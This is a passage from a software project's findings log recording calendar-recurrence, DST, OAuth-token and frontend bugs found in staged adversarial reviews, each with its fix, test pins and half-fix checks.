**Suggested fix.** Make the signal something FastAPI re-raises instead of swallowing: raise `HTTPException(413, "request body exceeds N bytes")` from `counting_receive` (FastAPI's `except HTTPException: raise` passes it straight through to the registered handler), or set a flag on `scope` and have the middleware emit the 413 based on the flag rather than on catching its own exception. Keep the `_BodyTooLarge` catch as the backstop for non-FastAPI consumers. Add a test that posts a chunked over-cap body to `/api/login` through `create_app` and asserts 413 plus the `connection: close` header.

**Pinned by** `test_a_chunked_oversized_body_is_a_413_through_the_real_app` in `backend/tests/test_backlog_aug19_stage1.py`.

## Filed during the Stage 3 review's own follow-up — 2026-08-20

A design review of the three fixes above, run before they were committed, found
four more. Three were defects in those fixes and are closed with them; the fourth
is a pre-existing bug of the same family, closed separately.

#### [x] The exact-duration repair truncated an RDATE;VALUE=PERIOD block to the master's DURATION

`backend/tasksd/ical/recur.py:251` · **high** · bug

`_repair_span`'s first exact-duration version read the governing length as "the
authored override's if one claims this instant, else the master's". An
`RDATE;VALUE=PERIOD` slot is neither — the library takes its length from the
period — so a four-hour block came back as thirty minutes, on an ordinary
January day with no transition near it, releasing three and a half hours of a
real commitment to the public booking page. The same failure the narrowing of
this function exists to prevent, through a door nobody enumerated.

**Fixed** by triggering on the artifact's SIGNATURE rather than on a list of
families: the emitted pair must state the authored length in WALL CLOCK and
deliver something else in real time. Anything else came from elsewhere and is
left alone, which fails closed. Pinned by
`test_an_rdate_period_keeps_its_own_length_not_the_masters`.

#### [x] A DATE-valued EXDATE did not block a re-homed range override, resurrecting a deleted occurrence

`backend/tasksd/ical/edit.py:781` · **medium** · bug

A DATE-valued EXDATE on a timed series removes the whole day —
`recurring_ical_events` keeps a separate date-keyed exclusion set — and
`_same_instant` answers False outright for a date/datetime pair. So the
skip-excluded-slots check compared instants only, the override was re-homed onto
the excluded day, and the deleted occurrence came back. `VALUE=DATE` is what a
client writes when the user deletes a whole day.

**Fixed** in `_excluded`, mirroring the library's second exclusion set. Pinned by
`test_a_date_valued_exdate_still_blocks_a_re_homed_override`.

#### [x] The unprobeable-rule refusal locked every occurrence of an RDATE-only series

`backend/tasksd/ical/edit.py:747` · **medium** · bug

The `_UNKNOWN` sentinel that stopped an unprobeable rule from DELETING a range
override answered `_UNKNOWN` for any resource with no RRULE — turning "delete the
override" into "refuse forever" for an RDATE-only series, which is a real series
the library expands normally. A fix for a data-loss bug closed a door the loss
did not.

**Fixed** by answering from the RDATE list when there is no rule, and reserving
"genuinely nothing later" for a resource that generates nothing at all. Pinned by
`test_an_rdate_only_series_can_still_have_one_occurrence_edited`.

#### [x] apply_occurrence_override seeds a covered-but-not-anchoring slot from the master, losing the range override's time and location

`backend/tasksd/ical/edit.py:806` · **medium** · bug

Editing "this event" on a slot a `RANGE=THISANDFUTURE` override COVERS but does
not ANCHOR builds the new single-slot override from the master
(`_new_override(master, anchor)`) rather than from the governing override. The
instance snaps back to the master's hour and loses the LOCATION the range
override supplied — the same loss `_detach_thisandfuture` carries DTSTART/DTEND
across to avoid, one branch over. `_governing_thisandfuture` already exists and
is not consulted here.

`test_recur.py::test_editing_a_thisandfuture_instance_edits_that_one` asserts
only `.summary`, which is why this has been invisible.

**Suggested fix.** Seed from `_governing_thisandfuture(cal, anchor)` when one
covers the slot, carrying its DTSTART/DTEND across as `_detach_thisandfuture`
does. Widen that test to assert `.start` and `.location`.

**Fixed** there, with one correction to the mechanics: the range override's
DTSTART/DTEND are **not** copied across. They belong to ITS anchor, several
occurrences back, so copying them would put every edited instance on the range
override's own date. What carries over is the SHIFT — `_tf_shift`, the
override's DTSTART minus its RECURRENCE-ID, the same quantity
`recur._thisandfuture_shifts` computes on the read path to place these instances
— re-applied to the anchor `_new_override` produced. (`_detach_thisandfuture`
copies directly because it is only reached when the override's RECURRENCE-ID
matched the anchor, so its times ARE that slot's.)

The widened test is what made this visible. It asserted only `.summary` — the one
field the edit itself sets, and therefore right whichever component seeded the
override; `.start` and `.location` are what tell the two seeds apart. The shared
fixture grew a LOCATION the master does not carry, so the question is answerable
rather than a matter of inspection.

Half-fix checked: seeding from the governing override without re-applying the
shift leaves the instance at the master's 09:00, so the pin still fails.

The control needed a second pass, and that is the part worth recording. The
over-correction here is seeding from ANY range override rather than the one that
COVERS the anchor — §3.2.13 is "this and future", not "this and every" — and the
first version of the control did not reach it: nothing in the file edited a slot
BEFORE the range override, so replacing `_governing_thisandfuture` with "the
first THISANDFUTURE override in the resource" passed everything. A case that
edits 2026-01-06 now fails it.

## Filed during the Stage 3 adversarial review — 2026-08-20

Three reviewers were run over the Stage 3 diff (`5c0abb1..648e6a3`) with
deliberately adversarial briefs: correctness of the fixes, quality of the pins
(revert each fix, check the pin actually catches it), and the trust model. They
reproduced 14 findings with runnable probes.

**Four were regressions introduced BY Stage 3** and are fixed in `d325ef9`,
recorded there rather than here: `_repair_span` corrupting authored DTEND spans,
`get_events_in_range` admitting every recurring row, `split_event` destroying the
tail on a lost response, and `_recover_orphaned_booking` disclosing across links.
Two pins (27, 34) were widened in the same commit after being shown to pass
against a half-fix.

**Three of the ten are now closed** — the three that were consequences of Stage 3
itself, rather than bugs the sweep would have found anyway. Each was pinned
before it was fixed, and each pin was then run against a plausible half-fix to
confirm it catches one. That last step earned its keep: pin A passed against a
fix that skipped claimed slots but not EXDATE'd ones, so it was widened before
the marker came off.

**All ten are now closed.** They were filed rather than fixed on the day because
each was its own change with its own risk, and the lesson of that same review is
that a fix written in a hurry to close a review comment is how three of the four
regressions above got in. The three that were consequences of Stage 3 itself went
with it; the other seven were closed by Stage 4, each pinned before it was fixed
— see `docs/STAGES.md`.

One theme is worth stating up front, because it is about the harness rather than
the code: **every backend pin in Stage 3 was widened with controls, and not one
frontend pin was.** Five of the ten were frontend, and four of those are "the pin
drives one of the N cases its own evidence names". The next stage should treat a
frontend pin as needing the same parametrisation a backend one gets.

#### [x] _detach_thisandfuture destroys a neighbouring override and re-creates the duplicate RECURRENCE-ID it was written to avoid

`backend/tasksd/ical/edit.py:774` · **high** · bug

`_next_generated` returns the next RRULE slot without checking whether an
override already claims it. Daily series, a `RANGE=THISANDFUTURE` override
anchored Jan 7, a plain single-slot override on Jan 8, user clicks "this event"
on Jan 7: the range override is re-homed onto Jan 8, which already has one. The
resource ends with two components claiming `20260108T090000` — the exact state
the fix's own commit message says the first attempt was rejected for — and the
user's explicit Jan-8 edit is silently deleted. It goes to Radicale, so the loss
is permanent. A THISANDFUTURE override with a per-instance override just after it
is the ordinary Apple Calendar / Thunderbird shape.

**Suggested fix.** `_next_generated` must skip slots an override already claims,
and re-home onto the first free generated slot after the anchor; if there is
none, drop the range override as the last-occurrence branch already does. Pin the
neighbouring-override case and assert RECURRENCE-ID values stay unique.

#### [x] _next_generated silently drops a range override when the rule is unprobeable

`backend/tasksd/ical/edit.py:774` · **medium** · bug

`_next_generated` returns None for a FREQ outside the `_FREQ` whitelist or over
`_MAX_PROBE_INSTANCES`, and `_detach_thisandfuture` then deletes the range
override. With `FREQ=HOURLY;INTERVAL=24` the override's summary, its moved time
and its LOCATION are all gone on the next PUT. The docstring calls this "the safe
direction"; it is silent permanent data loss, where the pre-fix code preserved
the values. `_next_generated` also ignores RDATE and EXDATE, so it can re-home an
override onto an excluded slot.

**Suggested fix.** When the next slot cannot be established, leave the range
override where it is and refuse the single-instance edit with a ValueError the
route maps to 422 — refusing an edit is recoverable, deleting authored values is
not.

#### [x] The nominal/exact DURATION split is defeated one layer up: the cached column is icalendar's re-serialization

`backend/tasksd/ical/read.py:244` · **medium** · bug

`f.duration = comp.get("DURATION").to_ical().decode()` — so `PT24H` is cached as
`P1D` and `PT36H` as `P1DT12H`. `advance`'s whole premise is that only the raw
string distinguishes nominal from exact, and it never sees the raw string. Any
exact duration whose time part is at least 24 h is misclassified: a `PT24H` block
across the spring-forward blocks 23 real hours, releasing one to the booking
page. `recur.py:92` has the same defect and is additionally dead code —
`recurring_ical_events` converts DURATION to DTEND on every instance it emits, so
`_end_fields`' DURATION branch never runs during expansion.

**Suggested fix.** Cache the wire value verbatim in a new column (or keep the raw
DURATION text alongside the parsed one) and pass that to `advance`. Then delete
or re-justify the `_end_fields` branch.

**Fixed** with a new `wire_durations(raw)` in `read.py` — an unfolding scan of the
ICS text that returns each VEVENT's DURATION exactly as it arrived, keyed by its
raw RECURRENCE-ID. No new column was needed: the existing `duration` column now
holds the wire value rather than `to_ical()`'s re-serialization, and every
consumer already re-parses it.

**A THIRD site had the same defect and this entry does not name it.**
`_exact_durations` (`recur.py:172`) also read `dur.to_ical()`, so the EXPANSION
path misclassified an exact day-or-longer duration too — and that is the path
that feeds `_repair_span`. Both are fixed; the pin drives both, because a repair
at one layer leaves the other wrong and looks done.

The pin's first version could not tell them apart: it anchored the expansion case
in UTC, where a 24-hour wall-clock span IS 24 real hours, so it passed against
the bug. Re-anchored across the 2026-03-08 spring-forward in America/Chicago,
which is the only place the distinction is observable — and it then caught the
half-fix (repair the column, leave `_exact_durations`) that the UTC version had
waved through.

`_end_fields`' DURATION branch is left in place and its comment already states
why it is unreachable from `expand_occurrences`; it now also says that
`_exact_durations` is the source of truth for an expanded instance.

#### [x] MERGED_SETTINGS omits the two security-relevant settings and the one its own evidence excused

`frontend/src/App.tsx:248` · **medium** · security

The gate's rationale — scalars are safe because "the value they carry is the one
just chosen" — is false for cycling controls, which are read-modify-write over
exactly the state that failed to load. `session_ttl_s` cycles: with the read
failed the panel reads "7 days" whatever the account holds, and one click PUTs
30 days — a 30x lengthening of the field `app.py` calls out as security-relevant.
`home_timezone` cycles the same way and decides where floating events land in the
public booking busy set. And `appearance` is excused in the pin's own evidence as
having a localStorage mirror, but `cacheAppearance` REMOVES the mirror whenever
no theme is active, so an account with saved themes and none active writes
`{appearance: {active: id}}` with no `themes` key over a top-level replace,
destroying the collection.

**Suggested fix.** Add all three. The predicate is "is the value computed from
state the read was supposed to populate", not "is it a scalar". Better still,
disable the controls while `settingsFailed.current` — the labels are lying too.

**Fixed** by adding all three and rewriting the comment to state the real
predicate, which "scalar" never was: read-modify-write is.

Two pins, and the second is what makes the first trustworthy. Half-fix checked:
adding `session_ttl_s` alone — the obvious partial repair, since it is the one
the finding leads with — passes the session-length pin and is caught by the
appearance one, which asserts that no PUT may carry an `appearance` object
without a `themes` key.

That pin also had to WAIT OUT the 400 ms debounce rather than wait FOR a PUT:
once the gate holds the write there is no PUT to wait for, so
`waitFor(putSettings called)` would have failed on the fix instead of on the bug
— a scaffolding assertion that only breaks once the code is right.

**Reopened and finished** after a later review, on two counts.

First, `home_timezone` — one of the three this entry names — had no pin. The list
shipped with `session_ttl_s` and `appearance` in it and the timezone missing, and
the whole suite stayed green; the checked half-fix ("`session_ttl_s` alone") does
not reach it either. It has its own pin now, driving the Time zone row after a
failed read.

Second, the fix applied the stated predicate to the three settings the finding
named rather than to the CLASS it declares. `sidebar_collapsed`,
`show_completed_tasks`, `calendar_show_done_tasks`, `calendar_fit` and
`time_format` are every one of them `next = !current` / `nextX(current)` over
state this same read populates — the definition the comment gives — and none was
in the list. Lower stakes than the session length or the booking zone, but the
same defect: the row shows the shipped default, the user presses it once, and the
negation of a lie is written over the account's real value. All five added, with
a pin on the clock and a CONTROL that a SUCCESSFUL read still lets both the clock
and the timezone through — the gate is a refusal, and every pin here drives a
FAILED read, so nothing else in the file would notice a gate that never lifts.
(`start_tab` and `tasks_view` stay out: both carry the value just chosen from a
picker, so what is written is what the user asked for either way.)

#### [x] reconcileReplay fires on the ordinary create path and its stated invariant is backwards

`frontend/src/data.tsx:351` · **medium** · bug

It runs after every `api.createTask`, and two comparisons are type-mismatched
against the real DTO: `CreateTaskBody.priority` is a label string while
`Task.priority` is the iCal integer, and `body.due` is `YYYY-MM-DDTHH:MM` while
the server returns `_iso()` output. So every bulk row with a timed due or a
priority provokes a spurious PATCH — a 20-row add is 40 writes, each a CalDAV PUT
with a SEQUENCE bump other clients see. Worse, the reconcile sits inside
`createMany`'s try, so a transient failure on that redundant PATCH marks a create
that fully landed as a failed row. The comment claims "a server-side
normalisation of something we left alone cannot provoke a write"; normalisation
of the fields we DID set is exactly what provokes it.

**Suggested fix.** Normalise both sides before comparing (parse `due` to an
instant, map the priority label to its integer), or compare against the body the
server echoes rather than the DTO. The pin cannot catch this — its `createTask`
double echoes `body.due` verbatim and never returns a numeric priority — so widen
the double first.

**Fixed**, and the double was widened first exactly as this entry instructs: it
now appends the seconds `_iso()` emits and returns the iCal integer alongside
`priority_label`. Without that the mismatch is invisible to every test in the
file.

`due` is compared through a `sameDue` helper that accepts the appended seconds;
`priority` is compared against `got.priority_label`, which is the DTO's own label
form and what the body should have been measured against all along.

The reconcile also moved OUT of `createMany`'s `try`. It ran inside it, so a
transient failure on a redundant PATCH marked a create that had fully landed as a
failed row — the composer kept the row and the user added it twice. The create is
settled first now, and the correction follows as a detached promise that logs
rather than failing the row.

Half-fix checked: normalise `due` and leave `priority`, which the pin catches.

#### [x] _intrinsic_order matches order.ts only when the server timezone equals the browser's

`backend/tasksd/mcp/api.py:120` · **medium** · bug

`_as_dt` does `value.astimezone().replace(tzinfo=None)` — the SERVER's local zone
— while `dueAt` compares an absolute instant against browser-local midnight. With
the browser in America/Chicago and the server in UTC (the ordinary Docker
deployment) the two disagree on a task due 23:00 local versus an all-day task the
next day. The docstring promises `due` "parsed to an instant … mirroring
`dueAt`", and this ordering decides which rows `limit` keeps. The 402-case
cross-check cannot see it: both implementations run in one process, so they share
a zone — the same blind spot the uid-only keying had before duplicates were added
to the corpus.

**Suggested fix.** Compare instants, not server-local naive datetimes; a date-only
due needs a zone to become an instant, and the honest one is the owner's
`home_timezone`. Then add a case to the corpus generator with the two zones
differing.

**Fixed** with a new `_due_instant(t, zone)` and an optional `zone` threaded
through `_intrinsic_order` / `_in_display_order`, supplied by a fail-soft
`McpApi._home_zone()` modelled on `TaskService._home_tz`.

`zone` is OPTIONAL and defaults to the previous behaviour, deliberately: the
402-case corpus check calls `_in_display_order` directly and has no service
handle, so a mandatory parameter would have meant editing the corpus test in the
same commit that changes the ordering — exactly the churn that hides a
regression. A control pins the no-zone path so it cannot drift.

The pin fixes `TZ=UTC` with `monkeypatch`/`tzset` rather than assuming it: the
defect is a DISAGREEMENT between two zones, so a run that happened to be in
America/Chicago would pass against the bug. Half-fix checked: ignore the `zone`
argument and keep `.astimezone()`.

#### [x] _desynchronizing falsely refuses Google Calendar's "every weekday"

`backend/tasksd/ical/edit.py:1006` · **medium** · bug

Under `FREQ=DAILY`, BYDAY is a filter rather than a day selector, so a +1-day drag
inside the weekday set desynchronizes nothing — but the guard blocks any day
change for any BYDAY on a non-WEEKLY rule.
`FREQ=DAILY;BYDAY=MO,TU,WE,TH,FR` is what Google Calendar writes for "Every
weekday", so dragging that series now answers 422 where it previously worked
correctly. The finding-16 fix traded a silent corruption for a refusal, and this
is the refusal landing on a legitimate series.

**Suggested fix.** Test the property rather than the shape: does the NEW DTSTART
still satisfy the rule? `_require_occurrence` next door already has the
machinery. Refuse only when it does not.

**REOPENED — the suggested fix does not work, and shipping it lost data.**

It was implemented as described (test the property: does the moved DTSTART still
fall on a day the rule names?) and shipped in `Stage 4 (9/11)`. The adversarial
review of that stage reproduced what it does:

```
BEFORE  Jan 7, 9, 14, 16, 19      (the user had deleted Jan 12)
AFTER   Jan 9, 12, 16, 19, 21
```

Jan 12 — deleted by the user — is back. Jan 14 — live — is gone. Two reasons,
and the second is fatal:

1. **The occurrence set does not move.** Every weekday is still in the set
   whatever weekday DTSTART lands on, so allowing the drag produces a series that
   did not move. Not what the user asked for either.
2. **Everything around the rule moves anyway.** `shift_series` shifts every
   EXDATE, RDATE and RECURRENCE-ID by `delta` before `_shift_rrule` runs. With the
   rule's own days unchanged, those land on the wrong occurrences — and an
   override's RECURRENCE-ID lands on a day the rule never generates, rendering as
   a duplicate beside the series.

This entry's premise was also wrong: "dragging that series now answers 422 where
it previously worked correctly". Before finding 16 it did not work correctly — it
silently corrupted in exactly the way above. The 422 was the improvement.

**Reverted.** `_desynchronizing` refuses BYDAY on a non-WEEKLY rule again, and
the reasoning is now a comment there so the next attempt starts from it. The
refusal is pinned by `test_dragging_an_every_weekday_series_refuses_rather_than_corrupting_it`,
and the OUTCOME a future fix must satisfy — a drag either is refused or leaves
the user's deleted days deleted and their live days live — by
`test_a_weekday_drag_does_not_move_an_exdate_onto_a_live_occurrence`.

**A real fix would have to rotate the whole recurrence set**, not just judge
DTSTART: shift the rule's days, EXDATEs, RDATEs and override anchors together, or
refuse. That is a substantially larger change than this entry assumed.

**Closed as a decision, not a fix — handed off as
[#63](https://github.com/nicholaskmitchell/smylte/issues/63).**

The refusal stays, and it is the right behaviour. This entry's premise was that
the drag "previously worked correctly"; it did not — before finding 16 it
silently corrupted the series in exactly the way recorded above, and the 422 was
the improvement. One attempt at the suggested fix shipped and destroyed user
data, and judging DTSTART alone cannot address it, because the damage is in the
properties AROUND the rule rather than in the rule's own validity.

The issue carries the whole record: the false premise, the measured loss, both
reasons the attempt failed, what a real fix has to rotate together, and the open
design question of what a "day change" even means for a filter-style rule.

Two tests hold the line meanwhile, and the second is the specification a future
fix must satisfy whichever way it goes:
`test_dragging_an_every_weekday_series_refuses_rather_than_corrupting_it` pins
the refusal, and `test_a_weekday_drag_does_not_move_an_exdate_onto_a_live_occurrence`
pins the OUTCOME — a drag either is refused, or leaves the user's deleted days
deleted and their live days live.

#### [x] The refresh-token scope check runs after the single-use consumption, burning the grant on a bad scope

`backend/tasksd/mcp/oauth.py:531` · **medium** · bug

`use_refresh_token` is called before the `asked - granted` widening check, so a
client that sends one over-wide scope has its refresh token consumed, and its
next ordinary refresh reads as a replay: `revoke_oauth_family` destroys the whole
grant and the owner is shown "this refresh token was already used". This file
argues the exact principle nine lines earlier for `_check_cv` — "checking after
would burn the one use on a request we were going to refuse anyway" — and the
same fix was not applied one branch over. It also desensitises the one alarm that
should mean a stolen token.

**Suggested fix.** Move the scope check above `use_refresh_token`, beside
`_check_cv`.

**Fixed** exactly there, with a comment pointing at the argument nine lines above
that had already been made and simply not applied one branch over. Half-fix
checked: leaving the check where it was catches on the pin's second half, which
re-presents the same token and demands 200 rather than only asserting the
refusal — the existing `test_a_refresh_cannot_widen_scope` asserts the refusal
alone, which is why this was invisible.

#### [x] list_oauth_grants now understates a grant's live capability, deterministically

`backend/tasksd/db/store.py:1085` · **low** · bug

Reporting the newest live token's scope replaced "an arbitrary row" with "the
narrowest, newest one", which is systematically wrong in the unsafe direction:
after a narrowing refresh the previous WIDE access token stays live for the rest
of its hour. A scoped MCP token can trigger this deliberately — refresh with
`scope=mcp:read` right after the code exchange — and the owner's Connected-apps
screen reads "read-only" while the connector keeps writing. Revocation still
works, so this is deception rather than escalation. The same line also binds `?1`
with a sequence, which is a DeprecationWarning today and an
`sqlite3.ProgrammingError` on Python 3.14.

**Suggested fix.** The screen answers "what can this connection still do", which
is the UNION of live tokens' scopes. Fix the parameter binding at the same time.

**Fixed** both. The union is taken in Python — scopes are space-separated strings
and SQLite has no set type, so a SQL version would need a recursive CTE to split
them — preserving first-seen order so the chips do not reshuffle on every poll.
The binding is now `?` twice with a two-element tuple; the whole-suite warning
count dropped from 7 to 2 with it.

**The pin does not catch the over-correction, and a control does.** "Union of
live tokens" is one step from "union of every token ever issued", which
over-reports in the same direction the old behaviour under-reported — the screen
would say a connector can still write because it could an hour ago. The pin has
no expired rows and passes against that; `test_a_grant_does_not_report_what_an_expired_token_could_do`
is what fails.

#### [x] A fall-back instance blocks three times the time it occupies

`backend/tasksd/ical/recur.py:251` · **low** · bug

The mirror of finding 26, left open deliberately when `_repair_span` was narrowed
in `d325ef9`: a 30-minute instance on the fall-back day is emitted as
`01:30-05:00 -> 02:00-06:00`, 90 real minutes. Repairing it means repairing every
span whose exact duration disagrees with its wall-clock one, and that corrupts
authored DTEND spans — which is the regression the narrowing exists to undo. It
over-blocks rather than under-blocks, so it withholds availability rather than
allowing a double-booking.

**Suggested fix.** Needs the master's own duration in scope so a library-derived
end can be told from an authored one — `expand_occurrences` has the master and
`_occurrence` does not. Pinned by
`test_a_fall_back_instance_over_blocks_rather_than_under_blocks`, which asserts
the current behaviour exactly so that changing it is a decision.

## Filed during the Stage 4 adversarial review — 2026-08-21

Three reviewers were run over the Stage 4 diff (`4258838..1f31d31`) with the same
briefs Stage 3 used: correctness of the fixes, quality of the pins, and the trust
model. They reproduced **8 defects, all consequences of that diff**, and two of
them were the same shape as the Stage 3 precedent — a fix that traded a loud
refusal for a silent corruption.

**All 8 are closed**, each pinned before it was fixed. They are recorded here
rather than as new numbered findings because none would have existed without the
work that introduced them:

| what | severity | where |
|---|---|---|
| a VALARM's `DURATION` read as the VEVENT's | high | `ical/read.py` |
| `_desynchronizing`'s property test destroying EXDATEs | high | `ical/edit.py` — **reverted**, finding reopened above |
| the refresh-token reuse detector reachable-around | high | `mcp/oauth.py` |
| `unfold` quadratic on the anonymous read path | medium-high | `ical/read.py` |
| `createMany` resolving with a correction in flight | medium | `data.tsx` |
| `list_oauth_grants` crediting SPENT refresh tokens | medium | `db/store.py` |
| `reconcileReplay`'s `start`, the same shape bug as `due` | medium | `data.tsx` |
| the SSE probe never resetting its counter | low | `api.ts` |

Two lessons worth keeping, because they generalise past this stage:

* **The VALARM bug is what a hand-written parser costs.** `wire_durations` exists
  because icalendar normalizes a `timedelta` and loses the nominal/exact
  distinction — a real problem — but replacing a library's parse with a scan over
  raw text means owning every structural rule the library already knew, and
  subcomponents were the one that was missed. The fix now also refuses to prefer
  a wire value that does not parse, so the whole class fails back to the library
  rather than forward into the cache.
* **Two of the three high findings were fixes that removed a refusal.** #45's
  Enter-approves, D5's allow-the-drag, and the OAuth reorder all made something
  that used to say no start saying yes. That is worth treating as a category:
  when a fix's shape is "stop refusing", the question to ask is what the refusal
  was protecting, and the answer is not always in the finding.

## Filed during remediation — 2026-08-20

#### [x] Five dialogs inline the same Escape effect with three different bindings, and nothing makes the modal contract checkable

`frontend/src/hooks.ts:16` · **low** · test-gap

`useEscape` was added with finding 58 and adopted in `TaskModal` only. The other
five dialogs still hand-roll it: `DayPopover.tsx:84` and `SchedulingView.tsx:240`
on `window`, `AppearancePanel.tsx:48` on `document`, `AddMultipleModal.tsx:278` on
`window` guarded by `busy`, and `SettingsMenu.tsx:105` unwinding a drill-down
rather than closing. Three bindings for one contract, and the difference is not
cosmetic: a `document` listener does not see a keydown dispatched at `window`.

Nothing enforces that a new dialog joins the set, which is how `TaskModal` — the
app's most-used dialog — came to have no handler at all for as long as it did.

**Suggested fix.** Move the four true modals onto `useEscape` (it takes a
callback, so the `busy` guard is `useEscape(busy ? noop : onClose)`); leave
`SettingsMenu`, whose Escape means "go back one step". Then add a test that
enumerates the dialog components and asserts each closes on an Escape dispatched
at `window` — the coverage that would have caught 58 before it was filed.

**Fixed**, with one deliberate deviation: `SettingsMenu` was consolidated too.
This entry said to leave it because its Escape means "go back one step" rather
than "close" — but the hook takes a callback, so `useEscape(back)` preserves the
semantics exactly and removes the last hand-rolled copy.

The claim that "its own suite is the control for that" was **false**, and a
wrong-fix review proved it: reverting `SettingsMenu` to a hand-rolled
**`document`** listener left all 725 tests green. `SettingsMenu.test.tsx` uses
`userEvent.keyboard('{Escape}')`, which dispatches at `document.activeElement`
and bubbles to `document` AND `window`, so it cannot tell the two bindings apart
— precisely the distinction this finding calls "not cosmetic". It is in the
Escape table now, driven with `fireEvent.keyDown(window, …)`.

The table's membership was also hand-maintained, which is exactly how finding 58
happened. A test now reads the component tree for `useEscape` importers and fails
when one is in no Escape test, so the next dialog cannot leave the set
silently.

The guarded one is `useEscape(useCallback(() => { if (!busy) onClose() }, …))`
rather than the entry's `busy ? noop : onClose` — same behaviour, but a stable
callback identity, so the listener is not torn down and re-registered on every
render.

The test is the table this entry asks for: four dialogs enumerated in one array,
each asserted to close on an Escape dispatched at **`window`**, plus that each
unsubscribes on unmount. A new dialog joins by being added to the array, which is
the coverage that would have caught 58. Two half-fixes checked — binding the hook
to `document` fails five of them (a `document` listener does not see a keydown at
`window`), and dropping the `busy` guard fails the mid-batch control.

#### [x] One failing calendar blanks the whole month, and the retry does not help

`frontend/src/data.tsx:608` · **low** · bug

`fetchWindow` fans out with `Promise.all`, so a single calendar answering 502
rejects the whole window and `windows` gets no rows at all — every other
calendar's events are discarded with it. Finding 41 fixed the part that made this
permanent (the window is no longer recorded as fetched on failure, so paging back
re-requests it), but the re-request has the same shape: while one collection is
unhealthy the user sees an empty month rather than the events that did load.

**Suggested fix.** This is a design question, not a defect with one answer, and it
should be decided before it is coded. `Promise.allSettled` plus painting what
arrived shows the user most of their month but silently under-reports — dangerous
next to the booking page's busy set, which must never under-report. The
alternative is to keep the all-or-nothing fetch and add an explicit "couldn't load
Work" state with a retry. Whichever is chosen, `eventsFor`'s fallback to the disk
mirror needs to be part of the reasoning.

**Decided and fixed:** `allSettled`, paint what arrived, **and name what did
not**. Neither option this entry offers is right alone — the concern it raises
about silent under-reporting is real, so the reporting is what makes keeping the
partial window safe, and it is asserted as part of the same pin.

`CalendarView` renders a `role="status"` banner naming the calendars that failed,
with a Retry that re-requests the window. Three details the entry's framing did
not cover:

* An `AuthError` from any calendar is re-thrown rather than recorded as a broken
  collection — it is the session, not the calendar, and the app must route to the
  login card rather than report the owner's whole account as broken.
* The window is left un-asked only when **every** calendar failed, so a healthy
  month is not re-requested on every page-turn because one collection is still
  down. Finding 41's pin stays green.
* ~~`eventsFor`'s disk-mirror fallback is untouched: it answers when the window
  has no rows at all~~ — **false, and it caused a regression.** `eventsFor` tests
  PRESENCE, not rows: `if (rows) return rows`, and `[]` is truthy. So a window
  where every calendar failed wrote an empty array that shadowed the mirror,
  where `Promise.all` used to reject and fall through to it. Fixed by writing the
  window only when something landed; pinned, with the assertion ordered AFTER the
  banner because the obvious ordering passed against the regression by catching
  the first paint.

Half-fixes checked: `allSettled` with no reporting (the silent under-report this
entry warns about) fails the pin, and reverting to `Promise.all` fails it on the
blank month.

#### [x] find_free_time derives an event's end by wall-clock addition — the DST-unsafe twin of a call Stage 3 already fixed

`backend/tasksd/mcp/api.py:635` · **medium** · bug

`b_start + length` on a zone-aware datetime adds wall-clock time, so across a DST
transition the busy interval covers the wrong hour. This is the identical defect
Stage 3 closed at `scheduling.py:163`, where the repair was `advance()` — which
applies an RFC 5545 duration's nominal and exact halves separately (`ical/read.py:128`).
The MCP path was not touched because the finding named only the scheduling one.

Spotted while exploring for Stage 4, not by a test: nothing drives
`smylte_find_free_time` across a transition. `find_free_time` is what an MCP
client calls to pick a meeting slot, so the wrong hour here becomes a real
double-booking on the owner's calendar.

**Suggested fix.** Use `advance(b_start, raw, length)` as `scheduling.busy_intervals`
does, and add a pin driving `find_free_time` across both the spring-forward and
the fall-back — the DST test gap (finding 64) was closed for `busy_intervals`
only, and closing it there is what uncovered two live defects.

**Fixed — but not as suggested, because the suggestion does not work.**
`advance(b_start, …)` changes nothing: `_as_dt` ends
`.astimezone().replace(tzinfo=None)`, so `b_start` is **naive** by the time it
reaches the addition, and `advance`'s whole job is to add the exact half to the
*instant*, which a naive value does not have. Verified — applied literally as
written, the pin still fails.

The fix is the ORDERING: apply the duration to the still-aware start, then
flatten. `b_end = _as_dt(advance(raw_start, event.get("duration"), length))`.

**That was wrong, and the closing review caught it.** The reasoning above stops
one line early: `normalize_offset` does make the value UTC, and UTC does have no
transitions — but `_as_dt` then converts the result back to **LOCAL**, which is
where the transitions live. So the nominal half was resolved as 24 real hours and
re-rendered against a clock where the day was 23 or 25, and `find_free_time`
offered an hour the owner was booked. The paragraph that declared the `P1D`
change deliberate was a declared regression.

The frame is the whole of it, and getting it wrong is two different bugs:
`b_start + length` puts the EXACT half on the wall clock, and
`advance(raw_start, …)` puts the NOMINAL half on UTC. Each half now goes in its
own frame — exact to the aware value, i.e. the instant; nominal to the local wall
clock afterwards — decomposed with `split_duration` directly, because nothing on
this path carries a real zone for `advance` to work against (`normalize_offset`
has made it UTC, and `.astimezone()` yields a fixed offset, which has no
transitions either).

Pinned across the fall-back with `P1D`, and with `P1DT2H`, which is the one shape
no single frame gets right. Both mutations — everything on the instant, and
everything on the wall clock — fail.

Pinned by an event at 2026-03-08 01:30 CST with `DURATION:PT2H`: it really ends
04:30 CDT, and the old code offered a free slot at 03:30 — an hour of a real
meeting sold twice, on the path an MCP client uses to pick a time. Controls cover
the ordinary same-day case, all-day events, and the end-less fallback.

One behaviour changes beyond the bug, and only for a DURATION spanning a
transition: a `P1D` on a UTC-anchored start now lands 24 real hours later rather
than at the same server-local wall clock. That is the value the DTO actually
holds being read as what it is.

#### [x] TasksView resolves subtasks, progress and fold state by bare uid, so one uid in two lists shows one row's children under both

`frontend/src/components/TasksView.tsx:203` · **low** · bug

The sibling of the keying finding closed above, and deliberately left open there
rather than folded in. The React keys and the provider's optimistic mutations are
now scoped by `(list, uid)`; the pane's own maps are not. `byUid`
(`TasksView.tsx:203` and `:239`), `parentByUid`/`kidsByParent` (`:209-218`),
`kidRows`, `collapsedSet`, the drag's `drag.over === task.uid` comparison
(`:575`) and `TaskGroup`'s entire prop surface — `childrenOf`, `progressOf`,
`collapsed`, `onCollapse`, `seen` — are all typed on a bare uid string.

So with the same uid in two lists both rows render one row's subtasks, one row's
progress ring and one row's fold state, and collapsing either collapses both.
`data.tsx`'s `addSub` has the same shape for the same reason: it is handed a uid
and picks the first match. Nothing is lost on the server — both candidates carry
the same parent uid, so a subtask lands under a real parent either way — but the
pane shows a merge of two tasks.

Not fixed with the keying finding because closing it means retyping `TaskGroup`
end to end, and a refactor of that size inside a keying fix is how the Stage 3
regressions got in.

**Suggested fix.** Type the recursion on `Task` (or on `taskKey`) rather than on
`uid`, in one pass: `byUid` → keyed by `taskKey`, `parentOf` returning the parent
